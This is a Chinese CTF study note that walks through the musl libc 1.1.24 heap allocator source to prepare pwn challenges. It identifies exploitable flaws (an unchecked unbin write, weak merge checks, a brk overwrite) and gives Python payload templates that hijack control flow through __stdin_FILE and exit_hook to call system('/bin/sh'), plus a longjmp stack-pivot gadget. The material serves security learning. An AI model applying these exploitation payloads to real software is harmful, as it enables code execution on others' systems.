# 源码学习

准备出两道musl的堆题，先过一遍 1.1.24 musl libc源码，要有一个比较深的印象和理解比较好。

## 数据结构  

chunk结构体，和libc下的chunk结构体类似，但是不区分为tcache，fastbins，smallbins，largebins这几类，统统归在bins当中。

psize表示前一堆块大小，csize表示当前堆块大小；next指向下一堆块，prev指向上一堆块，这两个只在释放进bins之后才会用来组成双链表，也没有fd_nextsize，bk_nextsize这两个结构（因为没有largebins）。

没有8字节的数据复用，psize和cisze的最低比特用来标识当前和前一堆块的分配情况。

```C=
struct chunk {
	size_t psize, csize;
	struct chunk *next, *prev;
};
```

bin结构体，类似glibc下的用来管理smallbins和largebins的双向链表，前8字节是lock不过没碰过，也不会像smallbins和largebins那样复用头部。

```C=
struct bin {
	volatile int lock[2];
	struct chunk *head;
	struct chunk *tail;
};
```

mal结构体，类似于glibc下的main_arena：
1. binmap用于快速检索bins可以使用的堆块。
2. bins数组，类似于glibc当中的bins数组（不区分smallbins和largebins）。
3. free_lock，free时用来加锁？没怎么碰过。
4. chunk管理方式想队列，先进先出。

```C=
static struct {
	volatile uint64_t binmap;
	struct bin bins[64];
	volatile int free_lock[2];
} mal;
```

以下是chunk大小与bins列表下标的对应关系，前32个bins只对应一种大小的chunk，后32个bins对应多种大小的chunk。

| bin 下标 i | chunk 大小个数 | chunk 大小范围 | 下标 i 与 chunk 大小范围的关系 | 
| :-------: | :-----------: | :-----------: | :------------------------: | 
| 0-31 | 1 | 0x20 – 0x400 | (i+1) * 0x20 | 
| 32-35 | 8 | 0x420 – 0x800 | (0x420+(i-32) 0x100) ~ (0x500+(i-32) 0x100) | 
| 36-39 | 16 | 0x820 – 0x1000 | (0x820+(i-36) 0x200) ~ (0x1000+(i-36) 0x200) | 
| 40-43 | 32 | 0x1020 – 0x2000 | (0x1020+(i-40) 0x400) ~ (0x1400+(i-40) 0x400) | 
| 44-47 | 64 | 0x2020 – 0x4000 | (0x2020+(i-44) 0x800) ~ (0x2800+(i-44) 0x800) | 
| 48-51 | 128 | 0x4020 – 0x8000 | (0x4020+(i-48) 0x1000) ~ (0x5000+(i-48) 0x1000) | 
| 52-55 | 256 | 0x8020 – 0x10000 | (0x8020+(i-52) 0x2000) ~ (0xa000+(i-52) 0x2000) | 
| 56-59 | 512 | 0x10020 – 0x20000 | (0x10020+(i-56) 0x4000) ~ (0x14000+(i-56) 0x4000) | 
| 60-62 | 1024 | 0x20020 – 0x38000 | (0x20020+(i-60) 0x8000) ~ (0x28000+(i-60) 0x8000) | 
| 63 | 无限 | 0x38000 以上 | 0x38000 ~  | 


## _alloc


### malloc

分配流程：
1. 调用adjust_size调整大小，保证0x10字节对齐。
2. size大于MMAP_THRESHOLD，采用mmap方式申请堆块，一般不考虑这里，感觉没有可利用的地方。
3. mask变量找到>=size的bins列表，如果为空则会调用expand_heap函数去扩展堆块，这里存在一个攻击点，如果改掉全局变量brk就能分配到目标地址，可以参考XCTF出题人的那道题。
4. mask变量不为0时，j变量取mask最低位也就是最小的bins下标，然后取对应的bins[j].head（队列结构先进先出）。
5. 调用pretrim函数处理拿到的堆块，功能是：如果当前chunk切完的部分仍然还在这个bins当中，那就切出来直接返回给用户，不用把这个chunk从bins列表中unbin出队，减少unbin次数以提高性能（？）pretrim函数审了一遍感觉没啥可利用，有一个类似unbin的双向链表的任意地址写，但是写的内容是split后的堆地址，比unbin的限制更严格。
6. unbin取出head堆块，这里就有一个非常明显的任意地址写了，unbin不经检查直接写，由于next/prev指针的内存区域都要可写，所以最终的效果是能够往任意（可写）地址写上一个可写地址。
7. 最后调用trim函数，把unbin拿出来的head堆块切一下，因为分配出来的可能大于用户需求，切完把剩下部分__bin_chunk放入bins列表中。

malloc函数源码如下：

```C=
void *malloc(size_t n)
{
	struct chunk *c;
	int i, j;

	if (adjust_size(&n) < 0) return 0;

	if (n > MMAP_THRESHOLD) {
		size_t len = n + OVERHEAD + PAGE_SIZE - 1 & -PAGE_SIZE;
		char *base = __mmap(0, len, PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (base == (void *)-1) return 0;
		c = (void *)(base + SIZE_ALIGN - OVERHEAD);
		c->csize = len - (SIZE_ALIGN - OVERHEAD);
		c->psize = SIZE_ALIGN - OVERHEAD;
		return CHUNK_TO_MEM(c);
	}

	i = bin_index_up(n);
	for (;;) {
		uint64_t mask = mal.binmap & -(1ULL<<i);
		if (!mask) {
			c = expand_heap(n);
			if (!c) return 0;
			if (alloc_rev(c)) {
				struct chunk *x = c;
				c = PREV_CHUNK(c);
				NEXT_CHUNK(x)->psize = c->csize =
					x->csize + CHUNK_SIZE(c);
			}
			break;
		}
		j = first_set(mask);
		lock_bin(j);
		c = mal.bins[j].head;
		if (c != BIN_TO_CHUNK(j)) {
			if (!pretrim(c, n, i, j)) unbin(c, j);
			unlock_bin(j);
			break;
		}
		unlock_bin(j);
	}

	/* Now patch up in case we over-allocated */
	trim(c, n);

	return CHUNK_TO_MEM(c);
}
```

pretrim函数源码：

```C=
/* pretrim - trims a chunk _prior_ to removing it from its bin.
 * Must be called with i as the ideal bin for size n, j the bin
 * for the _free_ chunk self, and bin j locked. */
static int pretrim(struct chunk *self, size_t n, int i, int j)
{
	size_t n1;
	struct chunk *next, *split;

	/* We cannot pretrim if it would require re-binning. */
	if (j < 40) return 0;
	if (j < i+3) {
		if (j != 63) return 0;
		n1 = CHUNK_SIZE(self);
		if (n1-n <= MMAP_THRESHOLD) return 0;
	} else {
		n1 = CHUNK_SIZE(self);
	}
	if (bin_index(n1-n) != j) return 0;

	next = NEXT_CHUNK(self);
	split = (void *)((char *)self + n);

	split->prev = self->prev;
	split->next = self->next;
	split->prev->next = split;
	split->next->prev = split;
	split->psize = n | C_INUSE;
	split->csize = n1-n;
	next->psize = n1-n;
	self->csize = n | C_INUSE;
	return 1;
}
```

unbin函数源码：

```C=
static void unbin(struct chunk *c, int i)
{
	if (c->prev == c->next)
		a_and_64(&mal.binmap, ~(1ULL<<i));
	c->prev->next = c->next;
	c->next->prev = c->prev;
	c->csize |= C_INUSE;
	NEXT_CHUNK(c)->psize |= C_INUSE;
}
```

trim函数源码：

```C=
static void trim(struct chunk *self, size_t n)
{
	size_t n1 = CHUNK_SIZE(self);
	struct chunk *next, *split;

	if (n >= n1 - DONTCARE) return;

	next = NEXT_CHUNK(self);
	split = (void *)((char *)self + n);

	split->psize = n | C_INUSE;
	split->csize = n1-n | C_INUSE;
	next->psize = n1-n | C_INUSE;
	self->csize = n | C_INUSE;

	__bin_chunk(split);
}
```


### calloc

先调用malloc函数去申请，然后再调用memset函数清空申请的区域。

calloc函数源码：

```C=
void *calloc(size_t m, size_t n)
{
	if (n && m > (size_t)-1/n) {
		errno = ENOMEM;
		return 0;
	}
	n *= m;
	void *p = malloc(n);
	if (!p) return p;
	if (!__malloc_replaced) {
		if (IS_MMAPPED(MEM_TO_CHUNK(p)))
			return p;
		if (n >= PAGE_SIZE)
			n = mal0_clear(p, PAGE_SIZE, n);
	}
	return memset(p, 0, n);
}
```


### realloc

realloc函数源码：
1. p == NULL：malloc申请返回
2. p != NULL：先尝试前后合并
3. new_size == 0：相当于free，直接放入bins列表当中
4. new_size <= old_size：切割
5. new_size > old_size：malloc申请新堆，调用memcpy将old_chunk内容拷贝至new_chunk，然后释放old_chunk。

```C=
void *realloc(void *p, size_t n)
{
	struct chunk *self, *next;
	size_t n0, n1;
	void *new;

	if (!p) return malloc(n);

	if (adjust_size(&n) < 0) return 0;

	self = MEM_TO_CHUNK(p);
	n1 = n0 = CHUNK_SIZE(self);

	if (IS_MMAPPED(self)) {
		size_t extra = self->psize;
		char *base = (char *)self - extra;
		size_t oldlen = n0 + extra;
		size_t newlen = n + extra;
		/* Crash on realloc of freed chunk */
		if (extra & 1) a_crash();
		if (newlen < PAGE_SIZE && (new = malloc(n-OVERHEAD))) {
			n0 = n;
			goto copy_free_ret;
		}
		newlen = (newlen + PAGE_SIZE-1) & -PAGE_SIZE;
		if (oldlen == newlen) return p;
		base = __mremap(base, oldlen, newlen, MREMAP_MAYMOVE);
		if (base == (void *)-1)
			goto copy_realloc;
		self = (void *)(base + extra);
		self->csize = newlen - extra;
		return CHUNK_TO_MEM(self);
	}

	next = NEXT_CHUNK(self);

	/* Crash on corrupted footer (likely from buffer overflow) */
	if (next->psize != self->csize) a_crash();

	/* Merge adjacent chunks if we need more space. This is not
	 * a waste of time even if we fail to get enough space, because our
	 * subsequent call to free would otherwise have to do the merge. */
	if (n > n1 && alloc_fwd(next)) {
		n1 += CHUNK_SIZE(next);
		next = NEXT_CHUNK(next);
	}
	/* FIXME: find what's wrong here and reenable it..? */
	if (0 && n > n1 && alloc_rev(self)) {
		self = PREV_CHUNK(self);
		n1 += CHUNK_SIZE(self);
	}
	self->csize = n1 | C_INUSE;
	next->psize = n1 | C_INUSE;

	/* If we got enough space, split off the excess and return */
	if (n <= n1) {
		//memmove(CHUNK_TO_MEM(self), p, n0-OVERHEAD);
		trim(self, n);
		return CHUNK_TO_MEM(self);
	}

copy_realloc:
	/* As a last resort, allocate a new chunk and copy to it. */
	new = malloc(n-OVERHEAD);
	if (!new) return 0;
copy_free_ret:
	memcpy(new, p, n0-OVERHEAD);
	free(CHUNK_TO_MEM(self));
	return new;
}
```


## free

free函数源码：

根据是否为mmap分配方式调用不同函数，IS_MMAPPED宏定义检查csize域的标志位。

```C=
void free(void *p)
{
	if (!p) return;

	struct chunk *self = MEM_TO_CHUNK(p);

	if (IS_MMAPPED(self))
		unmap_chunk(self);
	else
		__bin_chunk(self);
}
```

unmap_chunk函数源码：

检查是否为double_free，通过检查则调用__munmap释放堆块。

```C=
static void unmap_chunk(struct chunk *self)
{
	size_t extra = self->psize;
	char *base = (char *)self - extra;
	size_t len = CHUNK_SIZE(self) + extra;
	/* Crash on double free */
	if (extra & 1) a_crash();
	__munmap(base, len);
}
```

__bin_chunk函数源码：
1. 进入一个死循环for，首先判断前后堆块是否都已使用，都没办法合并则会跳出循环。
2. 调用alloc_rev和alloc_fwd函数尝试进行前向后向合并，这里的检查不太充分，前向合并根据self->csize进行，后向合并next指针则是调用NEXT_CHUNK(self)获得依赖于self->psize，如果能改这两个域就有可能造成堆叠。
3. 检查直至确认前向后向都不能再合并，然后将self放入对应的bins列表当中。

```C=
void __bin_chunk(struct chunk *self)
{
	struct chunk *next = NEXT_CHUNK(self);
	size_t final_size, new_size, size;
	int reclaim=0;
	int i;

	final_size = new_size = CHUNK_SIZE(self);

	/* Crash on corrupted footer (likely from buffer overflow) */
	if (next->psize != self->csize) a_crash();

	for (;;) {
		if (self->psize & next->csize & C_INUSE) {
			self->csize = final_size | C_INUSE;
			next->psize = final_size | C_INUSE;
			i = bin_index(final_size);
			lock_bin(i);
			lock(mal.free_lock);
			if (self->psize & next->csize & C_INUSE)
				break;
			unlock(mal.free_lock);
			unlock_bin(i);
		}

		if (alloc_rev(self)) {
			self = PREV_CHUNK(self);
			size = CHUNK_SIZE(self);
			final_size += size;
			if (new_size+size > RECLAIM && (new_size+size^size) > size)
				reclaim = 1;
		}

		if (alloc_fwd(next)) {
			size = CHUNK_SIZE(next);
			final_size += size;
			if (new_size+size > RECLAIM && (new_size+size^size) > size)
				reclaim = 1;
			next = NEXT_CHUNK(next);
		}
	}

	if (!(mal.binmap & 1ULL<<i))
		a_or_64(&mal.binmap, 1ULL<<i);

	self->csize = final_size;
	next->psize = final_size;
	unlock(mal.free_lock);

	self->next = BIN_TO_CHUNK(i);
	self->prev = mal.bins[i].tail;
	self->next->prev = self;
	self->prev->next = self;

	/* Replace middle of large chunks with fresh zero pages */
	if (reclaim) {
		uintptr_t a = (uintptr_t)self + SIZE_ALIGN+PAGE_SIZE-1 & -PAGE_SIZE;
		uintptr_t b = (uintptr_t)next - SIZE_ALIGN & -PAGE_SIZE;
#if 1
		__madvise((void *)a, b-a, MADV_DONTNEED);
#else
		__mmap((void *)a, b-a, PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
#endif
	}

	unlock_bin(i);
}
```

alloc_rev函数源码：

前向合并，将上一空闲堆块unbin出队，然后合并入当前堆块。

```C=
static int alloc_rev(struct chunk *c)
{
	int i;
	size_t k;
	while (!((k=c->psize) & C_INUSE)) {
		i = bin_index(k);
		lock_bin(i);
		if (c->psize == k) {
			unbin(PREV_CHUNK(c), i);
			unlock_bin(i);
			return 1;
		}
		unlock_bin(i);
	}
	return 0;
}
```

alloc_fwd函数源码：

后向合并，将下一空闲堆块unbin出队，然后合并入当前堆块。

```C=
static int alloc_fwd(struct chunk *c)
{
	int i;
	size_t k;
	while (!((k=c->csize) & C_INUSE)) {
		i = bin_index(k);
		lock_bin(i);
		if (c->csize == k) {
			unbin(c, i);
			unlock_bin(i);
			return 1;
		}
		unlock_bin(i);
	}
	return 0;
}
```


## 可利用的点

1. unbin函数的unlink操作，因为它的操作是unlink脱链，prev和next两个指针都要用上。效果是可以实现一个任意地址写任意地址（注意这两个指针prev/next对应的next/prev域要可写），之前有人问我能不能做到写的值是任意值，我想了好久感觉是不行的，但是可以用这个往mal.bins数组中某个bin写入要任意写的目标地址，再分配出来从而实现任意写。
2. 释放的时候合并检查不充分，有一个前向合并（alloc_fwd）和后向合并（alloc_rev）的过程，前向根据psize字段去查，后向根据csize字段去查。想要前向构造堆叠比较容易（一个off-by-null就够了），从前一个chunk覆盖掉psize并在堆里面构造好结构体以绕过检查；后向构造堆叠感觉稍微比较难，需要盖掉psize才能去覆盖csize，要求溢出长度要足够。
3. malloc申请mask为空时，会调用expand_heap函数去扩展堆块，如果把全局变量brk改成目标地址，就能实现任意地址分配。


## 控制流劫持

由于musl下的堆管理较为简单，没有实现__malloc_hook，__free_hook，__realloc_hook之类的hook功能，所以不能像glibc下那样用hook劫持控制流，目前会两种控制流的劫持方法。

1. FSOP

和glibc下一样，通过控制__stdin_FILE结构体里面的指针，在调用exit函数退出的时候就能劫持控制流。

__stdin_FILE结构体

```
pwndbg> p __stdin_FILE
$5 = {
  flags = 73,
  rpos = 0x0,
  rend = 0x0,
  close = 0x7ffff7fa5c00 <__stdio_close>,
  wend = 0x0,
  wpos = 0x0,
  mustbezero_1 = 0x0,
  wbase = 0x0,
  read = 0x7ffff7fa5cf0 <__stdio_read>,
  write = 0x0,
  seek = 0x7ffff7fa5de0 <__stdio_seek>,
  buf = 0x7ffff7ffc4e8 <buf+8> "",
  buf_size = 0,
  prev = 0x0,
  next = 0x0,
  fd = 0,
  pipe_pid = 0,
  lockcount = 0,
  mode = 0,
  lock = -1,
  lbf = -1,
  cookie = 0x0,
  off = 0,
  getln_buf = 0x0,
  mustbezero_2 = 0x0,
  shend = 0x0,
  shlim = 0,
  shcnt = 0,
  prev_locked = 0x0,
  next_locked = 0x0,
  locale = 0x0
}
pwndbg> x /40gx &__stdin_FILE
0x7ffff7ffb180 <__stdin_FILE>:	0x0000000000000049	0x0000000000000000
0x7ffff7ffb190 <__stdin_FILE+16>:	0x0000000000000000	0x00007ffff7fa5c00
0x7ffff7ffb1a0 <__stdin_FILE+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb1b0 <__stdin_FILE+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb1c0 <__stdin_FILE+64>:	0x00007ffff7fa5cf0	0x0000000000000000
0x7ffff7ffb1d0 <__stdin_FILE+80>:	0x00007ffff7fa5de0	0x00007ffff7ffc4e8
0x7ffff7ffb1e0 <__stdin_FILE+96>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb1f0 <__stdin_FILE+112>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb200 <__stdin_FILE+128>:	0x0000000000000000	0xffffffff00000000
0x7ffff7ffb210 <__stdin_FILE+144>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7ffb220 <__stdin_FILE+160>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb230 <__stdin_FILE+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb240 <__stdin_FILE+192>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb250 <__stdin_FILE+208>:	0x0000000000000000	0x0000000000000000
0x7ffff7ffb260 <__stdin_FILE+224>:	0x0000000000000000	0x0000000000000000
```

调用路径：`exit()->__stdio_exit()->close_file(__stdin_used)`。

exit()函数源码

```C=
_Noreturn void exit(int code)
{
    __funcs_on_exit();
    __libc_exit_fini();
    __stdio_exit();            		<------
    _Exit(code);
}
```

__stdio_exit()函数源码

```C=
void __stdio_exit(void)
{
    FILE *f;
    for (f=*__ofl_lock(); f; f=f->next) close_file(f);
    close_file(__stdin_used);  		<------	
    close_file(__stdout_used);
    close_file(__stderr_used);
}
```

close_file()函数源码

```C=
static void close_file(FILE *f)
{
    if (!f) return;
    FFINALLOCK(f);
    if (f->wpos != f->wbase) f->write(f, 0, 0); 						<------
    if (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);		<------
}
```

payload模版：
```python=
payload  = b'/bin/sh\x00'   # stdin->flags
payload += b'a' * 32
payload += p64(0xdeadbeef)  # stdin->wpos
payload += b'a' * 8
payload += p64(0xbeefdead)  # stdin->wbase
payload += b'a' * 8
payload += p64(system)      # stdin->write
```

踩坑点：

在出题的时候，拿到__stdin_FILE结构体的控制权后，也往该区域写入payload，调用exit()函数退出时，在close_file(__stdin_used)函数FFINALLOCK(f)这一步一直卡着过不去，不会走到下一行调用fwrite函数指针。

后来调试分析发现，我申请的大小是0x70，read函数读的长度也是0x70，实际发送payload只有0x50，可能读的时候会对__stdin_FILE结构体加锁，所以后面exit退出的时候尝试上锁也过不去了，把申请size改成0x50就没问题了。

2. exit_hook

glibc下也有的一种劫持控制流方法，不过glibc下exit_hook好像在ld里面（ld和libc偏移是固定的），musl下exit_hook在libc内的可写段。

调用路径：`exit()->__funcs_on_exit()`。

exit()函数源码

```C=
_Noreturn void exit(int code)
{
    __funcs_on_exit();				<------
    __libc_exit_fini();
    __stdio_exit();  
    _Exit(code);
}
```

__funcs_on_exit()函数源码

```
void __funcs_on_exit()
{
	void (*func)(void *), *arg;
	LOCK(lock);
	for (; head; head=head->next, slot=COUNT) while(slot-->0) {
		func = head->f[slot];
		arg = head->a[slot];
		UNLOCK(lock);
		func(arg);					<------
		LOCK(lock);
	}
}
```

head变量可读写，初始值为0，不能直接`libc.sym['head']`去找这个符号，会找成另外一个，要利用偏移`libc.sym['environ'] + 0x20`去找。

payload模版：
```python=
payload  = p64(fake_fl) + b'A' * 0xf8 
payload += p64(system) + b'A' * 0xf8
payload += p64(bin_sh)
```
fake_fl变量以及head变量写payload存放的地址。

3. 栈上劫持返回地址

这没啥好说的，和入门的栈溢出一样的流程，前提当然是要能够泄露栈地址（或许还有canary）然后任意写，一般libc里面都会有保存一些栈地址（比如environ变量），当然也又可能被出题人清了，结合具体题目分析吧。

4. 栈劫持

现在为了限制堆利用经常会开启沙箱来关闭execve，严格的话甚至还会限制只能用Open/Read/Write三种系统调用（musl的话还要多开几个mmap/munmap这几个系统调用不然musl_libc不能正常运行）。

开了沙箱的题目一般都是ORW来读flag文件，当然也有的沙箱规则不全面，比如没有限制架构导致绕过仍能拿shell。

控制流劫持思路仍然是上面总结的两个，但是劫持之后用到一个longjmp函数里面的gadgets片段：

```
.text:0000000000049503 loc_49503:
.text:0000000000049503 mov     rbx, [rdi]
.text:0000000000049506 mov     rbp, [rdi+8]
.text:000000000004950A mov     r12, [rdi+10h]
.text:000000000004950E mov     r13, [rdi+18h]
.text:0000000000049512 mov     r14, [rdi+20h]
.text:0000000000049516 mov     r15, [rdi+28h]
.text:000000000004951A mov     rdx, [rdi+30h]
.text:000000000004951E mov     rsp, rdx
.text:0000000000049521 mov     rdx, [rdi+38h]
.text:0000000000049525 jmp     rdx
.text:0000000000049525 longjmp endp
```

从0x4951A开始执行同时控制好rdi指针，就可以实现栈劫持，一般我会在堆上可读可写区域提前布置好ROPchain、filename、buf，然后再利用这个gadget劫持过去。

